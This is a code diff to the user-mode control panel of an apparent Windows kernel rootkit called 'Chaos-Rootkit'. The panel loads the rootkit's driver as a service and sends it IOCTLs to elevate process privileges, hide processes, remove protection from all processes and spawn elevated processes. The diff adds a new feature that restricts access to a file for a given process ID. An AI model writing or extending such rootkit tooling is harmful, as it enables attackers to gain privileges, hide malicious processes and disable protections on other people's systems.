@@ -102,6 +102,8 @@ Texture	readTextureFile()
 
 #define UNPROTECT_ALL_PROCESSES CTL_CODE(FILE_DEVICE_UNKNOWN,0x100,METHOD_BUFFERED ,FILE_ANY_ACCESS)
 
+#define RESTRICT_ACCESS_TO_FILE_CTL CTL_CODE(FILE_DEVICE_UNKNOWN,0x169,METHOD_BUFFERED ,FILE_ANY_ACCESS)
+
 BOOL loadDriver(char* driverPath) {
     SC_HANDLE hSCM, hService;
 
@@ -113,6 +115,7 @@ BOOL loadDriver(char* driverPath) {
     const char* g_serviceName = "Chaos-Rootkit";
 
     hService = OpenServiceA(hSCM, g_serviceName, SERVICE_ALL_ACCESS);
+
     if (hService != NULL) {
         printf("Service already exists.\n");
 
@@ -131,8 +134,13 @@ BOOL loadDriver(char* driverPath) {
                 CloseServiceHandle(hSCM);
                 return (1);
             }
-
             printf("Starting service...\n");
+        }
+
+        if (serviceStatus.dwCurrentState == SERVICE_RUNNING)
+        {
+            printf("The service is running already ...\n");
+
         }
 
         CloseServiceHandle(hService);
@@ -154,6 +162,7 @@ BOOL loadDriver(char* driverPath) {
 
     // Start the service
     if (!StartServiceA(hService, 0, nullptr)) {
+
         CloseServiceHandle(hService);
         CloseServiceHandle(hSCM);
         return (1);
@@ -167,7 +176,12 @@ BOOL loadDriver(char* driverPath) {
     return (0);
 }
 
-// Main code
+typedef struct foperationx {
+    int rpid;
+    char filename[MAX_PATH];
+}fopera, * Pfoperation;
+
+
 int main(int, char**)
 {
     glfwSetErrorCallback(glfw_error_callback);
@@ -220,13 +234,14 @@ int main(int, char**)
     ImGui_ImplOpenGL3_Init(glsl_version);
 
 
-                                                                
+
     char buf[120] = { 0 };
     bool show_demo_window = false;
     bool connect_to_rootkit = false;
     bool elev_specific_process = false;
     bool is_rootket_connected = false;
     bool unprotect_all_processes = false;
+    bool restrict_access_to_file = false;
     bool hide_specific_process = false;
     bool spawn_elevated_process = false;
     HANDLE hdevice = NULL;
@@ -238,7 +253,7 @@ int main(int, char**)
     int pid = 0;
     ImVec4 clear_color = ImVec4(0.45f, 0.55f, 0.60f, 1.00f);
 
-    #ifdef __EMSCRIPTEN__
+#ifdef __EMSCRIPTEN__
     io.IniFilename = nullptr;
     EMSCRIPTEN_MAINLOOP_BEGIN
 #else
@@ -249,7 +264,7 @@ int main(int, char**)
         float alive_rootkit[100];
         for (int n = 0; n < 100; n++)
             alive_rootkit[n] = sinf(n * 0.2f + ImGui::GetTime() * 1.5f);
-       
+
         ImGui_ImplOpenGL3_NewFrame();
         ImGui_ImplGlfw_NewFrame();
         ImGui::NewFrame();
@@ -296,7 +311,7 @@ int main(int, char**)
 
                 if (hdevice == INVALID_HANDLE_VALUE)
                 {
-                    printf(" INVALID_HANDLE_VALUE\n");
+                    printf("unable to connect to rootkit INVALID_HANDLE_VALUE\n");
 
                     is_rootket_connected = 0;
                 }
@@ -335,6 +350,8 @@ int main(int, char**)
 
             ImGui::Checkbox("Unprotect All Processes", &unprotect_all_processes);
 
+            ImGui::Checkbox("Restrict Access To File", &restrict_access_to_file);
+
             ImGui::Text("Application average %.3f ms/frame (%.1f FPS)", 1000.0f / io.Framerate, io.Framerate);
 
             ImGui::End();
@@ -343,7 +360,7 @@ int main(int, char**)
         if (elev_specific_process)
         {
             component_color_handler = 0;
-            ImGui::Begin("Another Window", &elev_specific_process);ImGui::Text("Enter PID");
+            ImGui::Begin("Another Window", &elev_specific_process); ImGui::Text("Enter PID");
 
             ImGui::SameLine();
 
@@ -365,25 +382,25 @@ int main(int, char**)
 
             if (component_color_handler == 1)
             {
-                ImGui::PushStyleColor(ImGuiCol_Text, ImVec4(1.0f, 0.0f, 0.0f, 1.0f)); 
+                ImGui::PushStyleColor(ImGuiCol_Text, ImVec4(1.0f, 0.0f, 0.0f, 1.0f));
 
                 ImGui::Text("Faild to send IOCTL, Please make sure to provide a valid pid.");
             }
             if (component_color_handler == 2)
             {
                 ImGui::PushStyleColor(ImGuiCol_Text, ImVec4(0.0f, 1.0f, 0.0f, 1.0f));
-                
+
                 ImGui::Text("IOCTL sent, Process now is elevated");
 
             }
 
             if (component_color_handler)
-                ImGui::PopStyleColor(); 
+                ImGui::PopStyleColor();
             ImGui::End();
         }
         if (hide_specific_process)
         {
-            ImGui::Begin("Another Window", &hide_specific_process);ImGui::Text("Enter PID");
+            ImGui::Begin("Another Window", &hide_specific_process); ImGui::Text("Enter PID");
 
             ImGui::SameLine();
 
@@ -411,21 +428,21 @@ int main(int, char**)
             }
             if (component_color_handler == 2)
             {
-                ImGui::PushStyleColor(ImGuiCol_Text, ImVec4(0.0f, 1.0f, 0.0f, 1.0f));     
+                ImGui::PushStyleColor(ImGuiCol_Text, ImVec4(0.0f, 1.0f, 0.0f, 1.0f));
 
                 ImGui::Text("IOCTL sent, Process now is hidden");
 
             }
 
             if (component_color_handler)
-                ImGui::PopStyleColor(); 
+                ImGui::PopStyleColor();
             ImGui::End();
         }
 
         if (unprotect_all_processes)
         {
 
-            ImGui::Begin("UNPROTECT_ALL_PROCESSES", &unprotect_all_processes);   
+            ImGui::Begin("UNPROTECT_ALL_PROCESSES", &unprotect_all_processes);
 
             if (ImGui::Button("UNPROTECT ALL PROCESSES"))
             {
@@ -442,7 +459,7 @@ int main(int, char**)
 
             if (component_color_handler == 1)
             {
-                ImGui::PushStyleColor(ImGuiCol_Text, ImVec4(1.0f, 0.0f, 0.0f, 1.0f)); 
+                ImGui::PushStyleColor(ImGuiCol_Text, ImVec4(1.0f, 0.0f, 0.0f, 1.0f));
                 ImGui::Text("Failed to send the IOCTL.");
 
 
@@ -450,20 +467,63 @@ int main(int, char**)
 
             if (component_color_handler == 2 || component_color_handler == 3)
             {
-                ImGui::PushStyleColor(ImGuiCol_Text, ImVec4(0.0f, 1.0f, 0.0f, 1.0f)); 
+                ImGui::PushStyleColor(ImGuiCol_Text, ImVec4(0.0f, 1.0f, 0.0f, 1.0f));
                 ImGui::Text("all processes protection has been removed !!");
 
             }
 
             if (component_color_handler)
-                ImGui::PopStyleColor(); 
+                ImGui::PopStyleColor();
             ImGui::End();
         }
-        
+
+
+        if (restrict_access_to_file)
+        {
+            fopera operation_client = { 0 };
+            ImGui::Begin("Chaos Rootkit PANEL", &restrict_access_to_file);
+            ImGui::Text("Enter PID"); ImGui::SameLine();
+            ImGui::InputText("##pid", buf, IM_ARRAYSIZE(buf)); // Added label for InputText
+            // ImGui::Text("Enter File Name"); ImGui::SameLine();
+             //ImGui::InputText("##filename", operation_client.filename, IM_ARRAYSIZE(operation_client.filename)); // Added label for InputText
+
+            if (ImGui::Button("restrict access to file X"))
+            {
+                operation_client.rpid = atoi(buf); // Declare pid here
+
+                if (DeviceIoControl(hdevice, RESTRICT_ACCESS_TO_FILE_CTL, (LPVOID)&operation_client, sizeof(operation_client), &lpBytesReturned, sizeof(lpBytesReturned), 0, NULL))
+                {
+                    component_color_handler = 2;
+                }
+                else
+                {
+                    component_color_handler = 1;
+                }
+            }
+
+            if (component_color_handler == 1)
+            {
+                ImGui::PushStyleColor(ImGuiCol_Text, ImVec4(1.0f, 0.0f, 0.0f, 1.0f));
+
+                ImGui::Text("Faild to send IOCTL, Please make sure to provide a valid pid.");
+            }
+            if (component_color_handler == 2)
+            {
+                ImGui::PushStyleColor(ImGuiCol_Text, ImVec4(0.0f, 1.0f, 0.0f, 1.0f));
+
+                ImGui::Text("IOCTL sent, File Restricted");
+
+            }
+
+            if (component_color_handler)
+                ImGui::PopStyleColor();
+            ImGui::End();
+        }
+
         if (spawn_elevated_process)
         {
 
-            ImGui::Begin("spawn elevated_process", &spawn_elevated_process);   
+            ImGui::Begin("spawn elevated_process", &spawn_elevated_process);
 
             if (ImGui::Button("spawn_elevated_process"))
             {
@@ -487,13 +547,13 @@ int main(int, char**)
 
             if (component_color_handler == 1)
             {
-                ImGui::PushStyleColor(ImGuiCol_Text, ImVec4(1.0f, 0.0f, 0.0f, 1.0f)); 
+                ImGui::PushStyleColor(ImGuiCol_Text, ImVec4(1.0f, 0.0f, 0.0f, 1.0f));
                 ImGui::Text("Failed to send the IOCTL.");
 
             }
             if (component_color_handler == 2 || component_color_handler == 3)
             {
-                ImGui::PushStyleColor(ImGuiCol_Text, ImVec4(0.0f, 1.0f, 0.0f, 1.0f)); 
+                ImGui::PushStyleColor(ImGuiCol_Text, ImVec4(0.0f, 1.0f, 0.0f, 1.0f));
 
                 if (component_color_handler == 3)
                 {
@@ -501,7 +561,7 @@ int main(int, char**)
                     ImGui::Text("The privilege of process has been elevated.");
 
                 }
-                else 
+                else
                 {
                     ImGui::Text("IOCTL %x sent!");
 
@@ -509,7 +569,7 @@ int main(int, char**)
             }
 
             if (component_color_handler)
-                ImGui::PopStyleColor(); 
+                ImGui::PopStyleColor();
             ImGui::End();
         }
         ImGui::Render();
@@ -528,7 +588,7 @@ int main(int, char**)
     EMSCRIPTEN_MAINLOOP_END;
 #endif
 
-        ImGui_ImplOpenGL3_Shutdown();
+    ImGui_ImplOpenGL3_Shutdown();
     ImGui_ImplGlfw_Shutdown();
     ImGui::DestroyContext();
 
